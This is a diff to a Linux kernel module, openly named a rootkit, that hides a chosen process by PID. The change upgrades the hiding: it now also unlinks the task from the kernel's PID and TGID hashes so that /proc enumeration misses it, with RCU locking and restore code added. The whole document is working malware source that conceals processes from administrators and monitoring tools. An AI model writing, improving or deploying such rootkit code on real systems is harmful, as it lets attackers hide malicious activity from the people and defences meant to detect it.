@@ -16,6 +16,8 @@
 #include <linux/sched.h>
 #include <linux/pid.h>
 #include <linux/sched/signal.h>
+#include <linux/rcupdate.h>
+#include <linux/rculist.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Experiment");
@@ -29,6 +31,8 @@ MODULE_PARM_DESC(target_pid, "PID of the process to hide");
 /* 保存目标进程在链表中的前驱节点 */
 static struct list_head *prev_task = NULL;
 static struct task_struct *hidden_task = NULL;
+static struct pid *hidden_pid = NULL;
+static struct pid *hidden_tgid = NULL;
 
 /*
  * hide_process - 从进程链表中摘除指定进程
@@ -52,22 +56,37 @@ static int hide_process(pid_t pid)
         return -ESRCH;
     }
 
+    rcu_read_lock();
     task = pid_task(pid_struct, PIDTYPE_PID);
     if (!task) {
+        rcu_read_unlock();
+        put_pid(pid_struct);
         printk(KERN_ERR "rootkit: task_struct for PID %d not found\n", pid);
         return -ESRCH;
     }
+    get_task_struct(task);
+    rcu_read_unlock();
 
     /* 保存前驱节点和task指针，用于后续恢复 */
     prev_task = task->tasks.prev;
     hidden_task = task;
+    hidden_pid = get_task_pid(task, PIDTYPE_PID);
+    hidden_tgid = get_task_pid(task, PIDTYPE_TGID);
 
-    /* 从进程链表中摘除 */
-    list_del(&task->tasks);
+    /* 从进程链表和PID哈希中摘除，避免 /proc 枚举到 */
+    list_del_rcu(&task->tasks);
+    if (hidden_pid) {
+        hlist_del_rcu(&task->pid_links[PIDTYPE_PID]);
+    }
+    if (hidden_tgid) {
+        hlist_del_rcu(&task->pid_links[PIDTYPE_TGID]);
+    }
+    synchronize_rcu();
 
     printk(KERN_INFO "rootkit: process PID=%d (%s) hidden\n", 
            pid, task->comm);
 
+    put_pid(pid_struct);
     return 0;
 }
 
@@ -80,11 +99,31 @@ static int hide_process(pid_t pid)
 static void show_process(void)
 {
     if (hidden_task && prev_task) {
-        list_add(&hidden_task->tasks, prev_task);
+        list_add_rcu(&hidden_task->tasks, prev_task);
+        if (hidden_pid) {
+            INIT_HLIST_NODE(&hidden_task->pid_links[PIDTYPE_PID]);
+            hlist_add_head_rcu(&hidden_task->pid_links[PIDTYPE_PID],
+                               &hidden_pid->tasks[PIDTYPE_PID]);
+        }
+        if (hidden_tgid) {
+            INIT_HLIST_NODE(&hidden_task->pid_links[PIDTYPE_TGID]);
+            hlist_add_head_rcu(&hidden_task->pid_links[PIDTYPE_TGID],
+                               &hidden_tgid->tasks[PIDTYPE_TGID]);
+        }
+        synchronize_rcu();
         printk(KERN_INFO "rootkit: process PID=%d (%s) restored\n",
                hidden_task->pid, hidden_task->comm);
+        put_task_struct(hidden_task);
         hidden_task = NULL;
         prev_task = NULL;
+    }
+    if (hidden_pid) {
+        put_pid(hidden_pid);
+        hidden_pid = NULL;
+    }
+    if (hidden_tgid) {
+        put_pid(hidden_tgid);
+        hidden_tgid = NULL;
     }
 }
 
